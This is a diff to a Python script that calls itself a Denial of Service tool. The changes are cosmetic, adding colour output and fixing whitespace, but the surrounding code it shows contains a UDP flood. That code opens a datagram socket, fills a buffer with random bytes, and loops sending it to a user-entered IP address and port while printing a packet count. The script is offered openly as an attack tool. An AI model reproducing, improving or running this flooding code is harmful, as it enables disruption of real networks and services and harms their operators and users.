@@ -4,6 +4,11 @@ import sys
 import time
 import random
 import os
+import colorama
+from colorama import Fore,Back, Style
+print(Fore.MAGENTA)
+print(Back.BLACK)
+
 
 print(r""" _______  _______ 
 (  ____ \/ ___   )
@@ -27,10 +32,10 @@ option = input("Website IP Lookup [1] Denial of Service Tool [2] :")
 
 if option == '1':
     target = input("Enter website address :")
-    print ("Target IP is",socket.gethostbyname(target))
+    print("Target IP is", socket.gethostbyname(target))
 elif option == '2':
 
- print(r""" ______   _______  _______ 
+    print(r""" ______   _______  _______ 
 (  __  \ (  ___  )(  ____ \
 | (  \  )| (   ) || (    \/
 | |   ) || |   | || (_____ 
@@ -38,9 +43,9 @@ elif option == '2':
 | |   ) || |   | |      ) |
 | (__/  )| (___) |/\____) |
 (______/ (_______)\_______)
-                           
+
 """)
-sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1024)
 print("cz's Denial of Service Tool")
 
@@ -64,8 +69,7 @@ while True:
             pass
         sock.sendto(bytes, (ip_add_entered, p0rt))
         sent = sent + 1
-        print ("Sent packets", (sent, ip_add_entered, p0rt))
+        print("Sent packets", (sent, ip_add_entered, p0rt))
     except KeyboardInterrupt:
-        exit()  
-
+        exit()
 
